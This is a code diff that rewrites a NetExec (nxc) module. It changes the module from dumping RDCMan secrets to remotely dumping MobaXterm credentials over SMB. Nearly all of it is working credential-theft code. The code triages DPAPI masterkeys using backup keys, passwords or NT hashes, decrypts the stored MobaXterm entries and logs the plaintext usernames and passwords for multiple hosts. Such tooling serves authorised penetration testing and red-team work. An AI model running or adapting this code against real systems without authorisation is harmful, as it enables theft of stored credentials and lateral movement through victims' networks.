@@ -1,6 +1,6 @@
-from dploot.triage.rdg import RDGTriage
 from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 from dploot.triage.backupkey import BackupkeyTriage
+from dploot.triage.mobaxterm import MobaXtermTriage, MobaXtermCredential, MobaXtermPassword
 from dploot.lib.target import Target
 from dploot.lib.smb import DPLootSMBConnection
 
@@ -8,8 +8,8 @@ from nxc.helpers.logger import highlight
 
 
 class NXCModule:
-    name = "rdcman"
-    description = "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
+    name = "mobaxterm"
+    description = "Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export"
     supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
@@ -21,6 +21,8 @@ class NXCModule:
         """
         self.pvkbytes = None
         self.masterkeys = None
+        self.conn = None
+        self.target = None
 
         if "PVK" in module_options:
             self.pvkbytes = open(module_options["PVK"], "rb").read()  # noqa: SIM115
@@ -66,7 +68,7 @@ class NXCModule:
             except Exception as e:
                 context.log.debug(f"Could not get domain backupkey: {e}")
 
-        target = Target.create(
+        self.target = Target.create(
             domain=domain,
             username=username,
             password=password,
@@ -79,11 +81,9 @@ class NXCModule:
             use_kcache=use_kcache,
         )
 
-        conn = None
-
         try:
-            conn = DPLootSMBConnection(target)
-            conn.smb_session = connection.conn
+            self.conn = DPLootSMBConnection(self.target)
+            self.conn.smb_session = connection.conn
         except Exception as e:
             context.log.debug(f"Could not upgrade connection: {e}")
             return
@@ -98,8 +98,8 @@ class NXCModule:
         if self.masterkeys is None:
             try:
                 masterkeys_triage = MasterkeysTriage(
-                    target=target,
-                    conn=conn,
+                    target=self.target,
+                    conn=self.conn,
                     pvkbytes=self.pvkbytes,
                     passwords=plaintexts,
                     nthashes=nthashes,
@@ -113,26 +113,16 @@ class NXCModule:
             context.log.fail("No masterkeys looted")
             return
 
-        context.log.success(f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting RDCMan secrets")
+        context.log.success(f"Got {highlight(len(self.masterkeys))} decrypted masterkeys. Looting MobaXterm secrets")
 
         try:
-            triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)
-            rdcman_files, rdgfiles = triage.triage_rdcman()
-            for rdcman_file in rdcman_files:
-                if rdcman_file is None:
-                    continue
-                for rdg_cred in rdcman_file.rdg_creds:
-                    if rdg_cred.type in ["cred", "logon", "server"]:
-                        log_text = "{} - {}:{}".format(rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode("latin-1")) if rdg_cred.type == "server" else "{}:{}".format(rdg_cred.username, rdg_cred.password.decode("latin-1"))
-                        context.log.highlight(f"[{rdcman_file.winuser}][{rdg_cred.profile_name}] {log_text}")
-                        
-            for rdgfile in rdgfiles:
-                if rdgfile is None:
-                    continue
-                for rdg_cred in rdgfile.rdg_creds:
-                    log_text = "{}:{}".format(rdg_cred.username, rdg_cred.password.decode("latin-1"))
-                    if rdg_cred.type == "server":
-                        log_text = f"{rdg_cred.server_name} - {log_text}"
-                    context.log.highlight(f"[{rdgfile.winuser}][{rdg_cred.profile_name}] {log_text}")
+            triage = MobaXtermTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
+            _, credentials = triage.triage_mobaxterm()
+            for credential in credentials:
+                if isinstance(credential, MobaXtermCredential):
+                    log_text = "{} - {}:{}".format(credential.name, credential.username, credential.password.decode("latin-1"))
+                elif isinstance(credential, MobaXtermPassword):
+                    log_text = "{}:{}".format(credential.username, credential.password.decode("latin-1"))
+                context.log.highlight(f"[{credential.winuser}] {log_text}")
         except Exception as e:
-            context.log.debug(f"Could not loot RDCMan secrets: {e}")
+            context.log.debug(f"Could not loot MobaXterm secrets: {e}")
